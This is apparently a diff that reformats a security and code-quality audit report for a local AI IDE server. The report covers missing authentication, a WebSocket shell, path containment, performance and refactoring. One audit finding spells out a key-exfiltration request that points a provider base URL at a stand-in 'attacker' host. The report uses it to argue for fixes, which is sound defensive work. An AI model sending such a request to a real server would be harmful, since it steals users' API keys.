@@ -14,15 +14,15 @@ condition, 3 fail otherwise.
 
 The IDE server binds `localhost` and exposes `/api/*` + `/ws` with no credential of any kind.
 
-| Issue | Location |
-|---|---|
-| `isOriginAllowed()` returns `true` when there is no `Origin` header — every non-browser client (curl, any local process, any script) passes the check | `packages/cli/src/server/server.ts:109-120`, used at `:126` and `:910` |
-| WS `/ws` upgrade has the same "no Origin ⇒ allow" rule, and the socket exposes a live shell | `server.ts:905-921`, `ptyManager.ts:22` |
-| Any WS frame that is not valid JSON is written verbatim to the PTY | `server.ts:1183-1188` |
+| Issue                                                                                                                                                                 | Location                                                                                         |
+| --------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
+| `isOriginAllowed()` returns `true` when there is no `Origin` header — every non-browser client (curl, any local process, any script) passes the check                 | `packages/cli/src/server/server.ts:109-120`, used at `:126` and `:910`                           |
+| WS `/ws` upgrade has the same "no Origin ⇒ allow" rule, and the socket exposes a live shell                                                                           | `server.ts:905-921`, `ptyManager.ts:22`                                                          |
+| Any WS frame that is not valid JSON is written verbatim to the PTY                                                                                                    | `server.ts:1183-1188`                                                                            |
 | `POST /api/keys` can rewrite a provider **base URL** to an arbitrary host; the engine then sends the user's real API key to that host (`Authorization: Bearer <key>`) | `server.ts:588-676` (base-var whitelist) + `packages/core/src/modules/handoff/openAi.ts:100-108` |
-| `POST /api/workspace` does `process.chdir()` — global process state — and `mkdirSync(..., {recursive:true})` on any absolute path | `server.ts:426-457` |
-| `GET /api/fs/browse` lists any directory on the machine | `server.ts:377-424` |
-| Request bodies accumulate with no size limit (`body += chunk`) | `server.ts:427-428, 589-590, 836-839` |
+| `POST /api/workspace` does `process.chdir()` — global process state — and `mkdirSync(..., {recursive:true})` on any absolute path                                     | `server.ts:426-457`                                                                              |
+| `GET /api/fs/browse` lists any directory on the machine                                                                                                               | `server.ts:377-424`                                                                              |
+| Request bodies accumulate with no size limit (`body += chunk`)                                                                                                        | `server.ts:427-428, 589-590, 836-839`                                                            |
 
 **Recommendation.** Generate an ephemeral session token at startup, require it on every `/api/*`
 and `/ws` request (header or query), and inject it into the served HTML so the browser client
@@ -30,7 +30,7 @@ uses it. The TODO list already tracks this (`TODO.md:30`) — it should be the n
 first item, not a "planned for v0.2.0" line item, because it is the difference between a local
 dev tool and a remote-code-execution bug for anyone running it on a shared machine.
 
-**Key-exfiltration chain to fix first:** `POST /api/keys {"baseVar":"OPENAI_BASE_URL","baseUrl":"http://attacker"}` → next model call sends the user's `OPENAI_API_KEY` to the attacker. The base-var whitelist was clearly meant to constrain *which variable* is written, not *where it points*.
+**Key-exfiltration chain to fix first:** `POST /api/keys {"baseVar":"OPENAI_BASE_URL","baseUrl":"http://attacker"}` → next model call sends the user's `OPENAI_API_KEY` to the attacker. The base-var whitelist was clearly meant to constrain _which variable_ is written, not _where it points_.
 
 ## 2. High — path containment is lexical, not real
 
@@ -76,6 +76,7 @@ allowlist. `TODO.md:31` tracks it.
 message containing that same call, and only then the `tool` result.
 
 Consequences:
+
 - the same `tool_call` id appears in two assistant messages (duplicate tool_use id),
 - the message roles no longer alternate, which the Anthropic Messages API rejects outright
   (`roles must alternate between "user" and "assistant"`),
@@ -91,7 +92,7 @@ drives three identical denied calls through `ToolLoop` and asserts the exact mes
 
 **6.1 Tests depend on the ambient environment (reproduced).**
 `getMaxOutputTokens()` reads `process.env.MUGIL_IDE_MAX_OUTPUT_TOKENS`, but
-`packages/core/tests/pipeline.test.ts:363` asserts the value equals the *default* 8192.
+`packages/core/tests/pipeline.test.ts:363` asserts the value equals the _default_ 8192.
 With `MUGIL_IDE_MAX_OUTPUT_TOKENS=22528` set in the shell the suite fails:
 
 ```
@@ -117,7 +118,7 @@ should be `Math.min(floor, contextRoom)` with a separate hard error when `contex
 `pipeline.ts:288-291` adds `countTokens(JSON.stringify(options.tools))` for the tools but the
 provider-side fallback in every client computes `countTokens(messages.map(m => m.content).join('\n'))`
 (`openAi.ts:198`, `anthropic.ts:203`, `openRouter.ts:208`, `vercel.ts:170`, `together.ts`, `cloudflare.ts`).
-Tool *arguments* in assistant messages and the tool schema are never counted, so the real prompt
+Tool _arguments_ in assistant messages and the tool schema are never counted, so the real prompt
 is larger than the estimate the budget logic reasons about.
 
 **6.4 `HandoffManager.route()` does not pick the cheapest model.**
@@ -132,8 +133,7 @@ Two different token estimates for the same request makes the "context overflow" 
 unreliable.
 
 **6.6 The `.env` writer corrupts values containing `" #".**
-`packages/core/src/env.ts:41` strips inline comments from *unquoted* values, but
-`serializeEnvFile()` (`:59-77`) never quotes the values it writes. Reproduced:
+`packages/core/src/env.ts:41`strips inline comments from *unquoted* values, but`serializeEnvFile()` (`:59-77`) never quotes the values it writes. Reproduced:
 
 ```
 serializeEnvFile({K:'abc #def'})  ->  "K=abc #def"
@@ -149,22 +149,22 @@ also emits a leading blank line when starting from an empty file — cosmetic, b
 `toOpenAiTools()` sorts tools by name and canonicalizes the JSON schema
 (`provider.ts:78-89`) precisely for "byte-level prefix stability", but
 `packages/core/src/modules/handoff/anthropic.ts:132-145` maps `options.tools` in the given
-order with no sorting. The Anthropic cache breakpoint sits on the *last* tool, so a changing
+order with no sorting. The Anthropic cache breakpoint sits on the _last_ tool, so a changing
 tool order (e.g. MCP tools discovered in a different order) invalidates the whole tool prefix.
 Sort and canonicalize identically to the OpenAI path.
 
 ## 7. Medium — performance
 
-| Hot spot | Location | Impact |
-|---|---|---|
-| The code graph is rebuilt from scratch on every `/api/graph` request, synchronously, on the event loop | `server.ts:678-704` | Multi-second stall on a real repo |
-| `collectCallEdges` is O(symbols²) with a fresh `RegExp` per pair | `packages/core/src/modules/codegraph/index.ts:194-210` | Same |
-| `attachSnippets` is computed twice per file | `codegraph/index.ts:285` (re-computes what `parseCodeFile` already did) | ~2× the parse cost |
-| Semantic cache lookup does `backend.keys()` then a `get()` per key | `packages/core/src/modules/smart-cache/index.ts:223-242` | O(n) Redis round-trips per miss |
-| The partial-cache lookup scans every backend key the same way | `smart-cache/index.ts:254-300` | O(n) again, on the hot path |
-| `/api/models` probes 7 providers **sequentially** | `server.ts:172-325` | ~7× the wall-clock of the slowest probe; `TODO.md:32` tracks the parallel version |
-| `budgetConversationHistory` tokenizes every turn twice (kept and evicted copies) | `packages/core/src/history.ts:100-104` | 2× tokenization cost per turn |
-| The pipeline re-tokenizes the growing tool history on every tool iteration | `pipeline.ts:325-330` | O(iterations²) tokenization in a long tool loop |
+| Hot spot                                                                                               | Location                                                                | Impact                                                                            |
+| ------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
+| The code graph is rebuilt from scratch on every `/api/graph` request, synchronously, on the event loop | `server.ts:678-704`                                                     | Multi-second stall on a real repo                                                 |
+| `collectCallEdges` is O(symbols²) with a fresh `RegExp` per pair                                       | `packages/core/src/modules/codegraph/index.ts:194-210`                  | Same                                                                              |
+| `attachSnippets` is computed twice per file                                                            | `codegraph/index.ts:285` (re-computes what `parseCodeFile` already did) | ~2× the parse cost                                                                |
+| Semantic cache lookup does `backend.keys()` then a `get()` per key                                     | `packages/core/src/modules/smart-cache/index.ts:223-242`                | O(n) Redis round-trips per miss                                                   |
+| The partial-cache lookup scans every backend key the same way                                          | `smart-cache/index.ts:254-300`                                          | O(n) again, on the hot path                                                       |
+| `/api/models` probes 7 providers **sequentially**                                                      | `server.ts:172-325`                                                     | ~7× the wall-clock of the slowest probe; `TODO.md:32` tracks the parallel version |
+| `budgetConversationHistory` tokenizes every turn twice (kept and evicted copies)                       | `packages/core/src/history.ts:100-104`                                  | 2× tokenization cost per turn                                                     |
+| The pipeline re-tokenizes the growing tool history on every tool iteration                             | `pipeline.ts:325-330`                                                   | O(iterations²) tokenization in a long tool loop                                   |
 
 **Recommendation.** Cache the code graph by root + mtime, move graph construction to the same
 worker-thread pattern already used for diffs (`packages/cli/src/server/diffRunner.ts` is a good
@@ -177,7 +177,7 @@ trie), and parallelize the model probes with `Promise.allSettled`.
   `together.ts`, `cloudflare.ts` each re-implement `buildBody`, the usage parsing, the
   `<think>` split and the tool-call extraction. They are the same OpenAI wire format with
   different headers/URLs. One configurable `OpenAiWireClient` with `{baseUrl, headers, path,
-  reasoningStyle, providerName}` would remove ~700 lines and five places to fix the same bug.
+reasoningStyle, providerName}` would remove ~700 lines and five places to fix the same bug.
 - **`server.ts` is a 1 243-line `if`-chain.** Every route is an inline `if (url.pathname === …)`
   block with its own body parsing, error handling and response writing. A small route table
   (`{method, path, handler}`) plus one `readJsonBody(req, limit)` helper and one
@@ -221,13 +221,13 @@ trie), and parallelize the model probes with `Promise.allSettled`.
 
 ## 10. Quick wins, ranked
 
-1. Fix test hermeticity (§6.1) — clears the env-dependent suite and 3 CLI failures. *~15 min.*
-2. Fix the tool-loop duplicate assistant message (§5) + add a regression test. *~1 h.*
-3. Quote values written by `serializeEnvFile` (§6.6) + test. *~30 min.*
-4. Add a body-size limit to the JSON body readers (§1). *~30 min.*
-5. Sort the Anthropic tool list (§6.7) + canonicalize its schema. *~30 min.*
-6. Make `route()` actually pick the cheapest model (§6.4). *~30 min, direct cost impact.*
-7. Clamp the output budget to the context room (§6.2). *~30 min.*
+1. Fix test hermeticity (§6.1) — clears the env-dependent suite and 3 CLI failures. _~15 min._
+2. Fix the tool-loop duplicate assistant message (§5) + add a regression test. _~1 h._
+3. Quote values written by `serializeEnvFile` (§6.6) + test. _~30 min._
+4. Add a body-size limit to the JSON body readers (§1). _~30 min._
+5. Sort the Anthropic tool list (§6.7) + canonicalize its schema. _~30 min._
+6. Make `route()` actually pick the cheapest model (§6.4). _~30 min, direct cost impact._
+7. Clamp the output budget to the context room (§6.2). _~30 min._
 8. Add the session token to `/api/*` and `/ws` (§1) — the biggest single change, and the one
    that makes the tool safe to expose on a shared machine.
 9. Realpath containment (§2) and webfetch SSRF guard (§4).
@@ -237,7 +237,7 @@ trie), and parallelize the model probes with `Promise.allSettled`.
 
 ---
 
-### Notes on what is *not* wrong
+### Notes on what is _not_ wrong
 
 The following are well-built and should not be touched: the SSE parsers
 (`packages/core/src/modules/handoff/stream.ts` — the `StreamThinkSplitter` and the
